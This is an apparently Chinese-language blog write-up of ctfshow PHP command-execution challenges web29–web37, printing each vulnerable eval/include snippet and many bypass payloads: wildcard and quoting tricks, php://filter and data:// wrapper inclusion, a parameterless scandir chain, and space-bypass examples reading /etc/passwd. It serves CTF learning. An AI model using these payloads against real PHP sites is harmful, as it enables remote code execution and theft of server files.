@@ -1,0 +1,1282 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Gu0f3n's blog | Gu0f3n's blog</title><meta name="author" content="Gu0f3n"><meta name="copyright" content="Gu0f3n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web29 过滤 FLAG访问网站，源码如下： php&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c &#x3D; $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Gu0f3n&#39;s blog">
+<meta property="og:url" content="https://gu0f3n.github.io/imgs/ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html">
+<meta property="og:site_name" content="Gu0f3n&#39;s blog">
+<meta property="og:description" content="web29 过滤 FLAG访问网站，源码如下： php&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c &#x3D; $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gu0f3n.github.io/img/3.jpg">
+<meta property="article:published_time" content="2024-08-01T14:02:17.141Z">
+<meta property="article:modified_time" content="2024-08-01T14:02:17.141Z">
+<meta property="article:author" content="Gu0f3n">
+<meta property="article:tag" content="patience">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gu0f3n.github.io/img/3.jpg"><link rel="shortcut icon" href="/img/1.png"><link rel="canonical" href="https://gu0f3n.github.io/imgs/ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = true
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Gu0f3n\'s blog',
+  isPost: false,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-01 22:02:17'
+}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Gu0f3n's blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-sharp-duotone fa-solid fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-solid fa-heart-pulse"></i><span> 关于我</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url('/img/2.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Gu0f3n's blog"><span class="site-name">Gu0f3n's blog</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-sharp-duotone fa-solid fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-solid fa-heart-pulse"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="page-site-info"><h1 id="site-title">Gu0f3n's blog</h1></div></header><main class="layout" id="content-inner"><div id="page"><div id="article-container"><h2 id="web29-过滤-FLAG"><a href="#web29-过滤-FLAG" class="headerlink" title="web29 过滤 FLAG"></a>web29 过滤 FLAG</h2><p>访问网站，源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过代码审计发现，这里过滤了关键字 <code>flag</code>，使用了 <code>i</code> 修饰符表示不区分大小写的匹配 flag 关键字。</p>
+<p>先试用如下 PAYLOAD 获取 FLAG 文件的所在位置，一般 CTF 比赛的 FLAG 都在系统的根目录下，或者网站的根目录下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240113/1705108591_65a1e46fd640e78c0752f.png"><img src="https://image.3001.net/images/20240113/1705108591_65a1e46fd640e78c0752f.png" alt="image-20231021164347990"></a></p>
+<p>而这里就在网站根目录下名为 <code>flag.php</code>，对于过滤了 flag 关键字，我们可以使用如下方法绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=system(&quot;nl fla?.php&quot;);</span><br><span class="line">?c=system(&quot;nl fla*&quot;);</span><br><span class="line">?c=system(&quot;nl fla[e-g].php&quot;);</span><br><span class="line">?c=system(&quot;nl fla[g].php&quot;);</span><br><span class="line">?c=system(&quot;nl fla&#x27;&#x27;g.php&quot;);</span><br><span class="line">?c=system(&quot;nl fla``g.php&quot;);</span><br><span class="line">?c=system(&quot;nl fla\g.php&quot;);</span><br><span class="line">?c=system(&quot;nl fla$&#123;x&#125;g.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>以上代码运行之后，右键查看源代码即可看到 FLAG，当然还可以使用如下方式进行绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=eval($_GET[cmd]);&amp;cmd=system(&#x27;nl flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用如下方式进行绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=$a=&#x27;fla&#x27;;$b=&#x27;g.php&#x27;;include(&quot;php://filter/read=convert.base64-encode/resource=&#123;$a&#125;&#123;$b&#125;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240113/1705108597_65a1e475140fe79e64111.png"><img src="https://image.3001.net/images/20240113/1705108597_65a1e475140fe79e64111.png" alt="image-20231021170110130"></a></p>
+<h2 id="web30-简单的过滤-1"><a href="#web30-简单的过滤-1" class="headerlink" title="web30 简单的过滤 - 1"></a>web30 简单的过滤 - 1</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过代码审计发现不区分大小写的过滤了 <code>flag</code>、<code>system</code>、<code>php</code> 等关键字。可以通过如下方法绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=passthru(&quot;nl fla?.ph?&quot;);</span><br><span class="line">?c=passthru(&quot;nl fla*&quot;);</span><br><span class="line">?c=passthru(&quot;nl fla[e-g].ph[o-p]&quot;);</span><br><span class="line">?c=passthru(&quot;nl fla[g].php&quot;);</span><br><span class="line">?c=passthru(&quot;nl fla&#x27;&#x27;g.ph&#x27;p&#x27;&quot;);</span><br><span class="line">?c=passthru(&quot;nl fla``g.ph``p&quot;);</span><br><span class="line">?c=passthru(&quot;nl fla\g.ph\p&quot;);</span><br><span class="line">?c=passthru(&quot;nl fla$&#123;x&#125;g.p$&#123;x&#125;hp&quot;);</span><br><span class="line">?c=eval($_GET[cmd]);&amp;cmd=system(&#x27;nl flag.php&#x27;);</span><br><span class="line">?c=$a=&#x27;fla&#x27;;$b=&#x27;g.&#x27;;$c=&#x27;ph&#x27;;$d=&#x27;p&#x27;;include(&quot;&#123;$c&#125;&#123;$d&#125;://filter/read=convert.base64-encode/resource=&#123;$a&#125;&#123;$b&#125;&#123;$c&#125;&#123;$d&#125;&quot;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web31-简单的无参-RCE"><a href="#web31-简单的无参-RCE" class="headerlink" title="web31 简单的无参 RCE"></a>web31 简单的无参 RCE</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过代码审计发现不区分大小写过滤了 <code>flag</code>、<code>system</code>、<code>php</code>、<code>cat</code>、<code>sort</code>、<code>shell</code>、<code>.</code>、<code>空格</code>、<code>单引号</code>。</p>
+<p><strong>对于过滤了 <code>cat</code> 命令可以使用如下命令代替：</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cat</code></td>
+<td>从第一行开始显示全部的文本内容</td>
+</tr>
+<tr>
+<td><code>tac</code></td>
+<td>从最后一行开始，显示全部分文本内容，与 cat 相反</td>
+</tr>
+<tr>
+<td><code>nl</code></td>
+<td>显示文本时，输出行号</td>
+</tr>
+<tr>
+<td><code>more</code></td>
+<td>按页显示文件内容</td>
+</tr>
+<tr>
+<td><code>less</code></td>
+<td>如 more 命令差不多，也是按页显示内容</td>
+</tr>
+<tr>
+<td><code>head</code></td>
+<td>从头开始显示文件指定的行数，默认只显示前 10 行</td>
+</tr>
+<tr>
+<td><code>tail</code></td>
+<td>显示文件指定的结尾行数</td>
+</tr>
+<tr>
+<td><code>sort</code></td>
+<td>对文件内容进行排序</td>
+</tr>
+</tbody></table>
+<p><strong>对于过滤了<code>空格</code>可以使用如下方法代替：</strong></p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>示例</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$IFS$1</code></td>
+<td><code>cat$IFS$1/etc/passwd</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>$IFS</code></td>
+<td><code>cat$IFS/etc/passwd</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>$&#123;IFS&#125;</code></td>
+<td><code>cat$&#123;IFS&#125;/etc/passwd</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>&#123;&#125;</code></td>
+<td><code>&#123;cat,/etc/passwd&#125;</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>%09</code></td>
+<td><code>cat%09/etc/passwd</code></td>
+<td>需要 URL 解码</td>
+</tr>
+<tr>
+<td><code>&lt;</code></td>
+<td><code>cat&lt;/etc/passwd</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>&lt;&gt;</code></td>
+<td><code>cat&lt;&gt;/etc/passwd</code></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>绕过方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=eval($_GET[&quot;cmd&quot;]);&amp;cmd=show_source(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218701_65a3928dbe3b28938ff1d.png"><img src="https://image.3001.net/images/20240114/1705218701_65a3928dbe3b28938ff1d.png" alt="image-20231021180325727"></a></p>
+<p>这里尝试空格替换均无法绕过，当然这里还有一种其他方法，那就是无参读取 <code>flag.php</code> 文件的内容。</p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218707_65a39293ea358da004a3c.png"><img src="https://image.3001.net/images/20240114/1705218707_65a39293ea358da004a3c.png" alt="image-20231021180416539"></a></p>
+<p>下面逐个解析以上 PAYLOAD 所涉及的函数：</p>
+<p><strong>localeconv</strong></p>
+<p>获取数字格式信息</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>该函数没有参数</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>返回值：返回值类型为一个数组，其中数组第一个元素的值为 <code>.</code></p>
+<p><strong>pos</strong></p>
+<p><code>current()</code> 函数的别名，用于返回数组中的当前值（也就是数组中第一个元素的值）。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>array</code></td>
+<td>要操作的数组</td>
+</tr>
+</tbody></table>
+<p>返回值： 数组中第一个元素的值</p>
+<p><strong>scandir</strong></p>
+<p>列出指定路径中的文件和目录。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>directory</code></td>
+<td>要被浏览的目录</td>
+</tr>
+</tbody></table>
+<p>返回值： 成功则返回包含有文件名的 array，如果失败则返回 **<code>false</code>**。</p>
+<p>其他参数可选，详情可见：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.scandir">https://www.php.net/manual/zh/function.scandir</a></p>
+<p><strong>array_reverse</strong></p>
+<p>返回单元顺序相反的数组</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>array</code></td>
+<td>要被操作的数组</td>
+</tr>
+</tbody></table>
+<p>返回值： 返回反转后的数组。</p>
+<p><strong>next</strong></p>
+<p>将数组中的内部指针向前移动一位</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>array</code></td>
+<td>要被操作的数组</td>
+</tr>
+</tbody></table>
+<p>返回值：返回数组内部指针指向的下一个单元的值，或当没有更多单元时返回 **<code>false</code>**。</p>
+<p><strong>show_source</strong></p>
+<p><code>highlight_file</code> 函数的别名，用于语法高亮一个文件。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>filename</code></td>
+<td>要高亮文件的路径。</td>
+</tr>
+</tbody></table>
+<p>以下继续对函数执行所获得的值进行分解：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line">// 6. 此时show_source函数将next函数返回的 flag.php 作为参数 因此获取FLAG</span><br><span class="line">show_source( </span><br><span class="line">    // 5. next函数用于将array_reverse反转好的数组 指针指向第二个元素 获取的值为 flag.php 返回</span><br><span class="line">    next(  </span><br><span class="line">    // 4. array_reverse将scandir函数返回的数组进行反转 顺序为 index.php flag.php . .. </span><br><span class="line">    array_reverse( </span><br><span class="line">    // 3. scandir函数将pos函数的返回值 . 作为参数进行处理 此时scandir 返回目录文件的数组</span><br><span class="line">    scandir( </span><br><span class="line">    // 2. pos函数获取localeconv中第一个元素的值 也就是 . </span><br><span class="line">    pos( </span><br><span class="line">      // 1. localeconv返回一个第一个元素的值为 . 的数组</span><br><span class="line">      localeconv() </span><br><span class="line">    )</span><br><span class="line">    )</span><br><span class="line">    )</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web32-php-伪协议-1"><a href="#web32-php-伪协议-1" class="headerlink" title="web32 php 伪协议 - 1"></a>web32 php 伪协议 - 1</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过代码审计发现了不区分大小写的过滤了如下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag`、`system`、`php`、`cat`、`sort`、`shell`、`.`、`空格`、`&#x27;`、`echo`、`;`、`(`、以及 `反引号</span><br></pre></td></tr></table></figure>
+
+<p>绕过方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=include$_GET[&quot;url&quot;]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218715_65a3929bf1904f635afd4.png"><img src="https://image.3001.net/images/20240114/1705218715_65a3929bf1904f635afd4.png" alt="image-20231021192722283"></a></p>
+<p>base64 解码之后即可得到 FLAG：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218720_65a392a01e8f5b8192dbd.png"><img src="https://image.3001.net/images/20240114/1705218720_65a392a01e8f5b8192dbd.png" alt="image-20231021192805094"></a></p>
+<p>其他 PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCdubCBmbGFnLnBocCcpOz8%2b</span><br></pre></td></tr></table></figure>
+
+<h2 id="web33-36-php-伪协议-2"><a href="#web33-36-php-伪协议-2" class="headerlink" title="web33-36 php 伪协议 - 2"></a>web33-36 php 伪协议 - 2</h2><p>web33 源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不区分大小写的过滤内容如下：</p>
+<blockquote>
+<p>flag、system、php、cat、sort、shell、.、空格、单引号、反引号、echo、分号、(、双引号</p>
+</blockquote>
+<p>由于过滤了单引号和双引号，我们需要在一题的 PAYLOAD 中稍作更改，将双引号去掉即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=include$_GET[url]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218726_65a392a681d5f20a2b012.png"><img src="https://image.3001.net/images/20240114/1705218726_65a392a681d5f20a2b012.png" alt="image-20231021193257702"></a></p>
+<p>去掉双引号之后为什么还能执行呢？只要参数中不带有空格，那么都是可以不适用单双引号进行包裹的，但是我们在开发中，一般都使用单引号或者双引号进行包裹。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218730_65a392aa9783af2c3ea67.png"><img src="https://image.3001.net/images/20240114/1705218730_65a392aa9783af2c3ea67.png" alt="image-20231021193443241"></a></p>
+<p>当然这里还可以使用如下 PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;nl flag.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web37-文件包含过滤-flag"><a href="#web37-文件包含过滤-flag" class="headerlink" title="web37 文件包含过滤 flag"></a>web37 文件包含过滤 flag</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里不区分大小写的过滤了 <code>flag</code> 关键字。故而 <code>php://filter</code> 伪协议是不能使用的。</p>
+<p>但是这里可以使用 <code>data</code> 协议：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=data://text/plain,&lt;?php system(&quot;nl fla*.php&quot;);?&gt;</span><br><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdubCBmbGFnLnBocCcpOz8%2b</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218738_65a392b2cccd0079389f1.png"><img src="https://image.3001.net/images/20240114/1705218738_65a392b2cccd0079389f1.png" alt="image-20231021200248539"></a></p>
+<p>当然这里也可以使用 <code>php://input</code> 协议，除了使用伪协议以外，我们还可以尝试包含日志进行 getshell：</p>
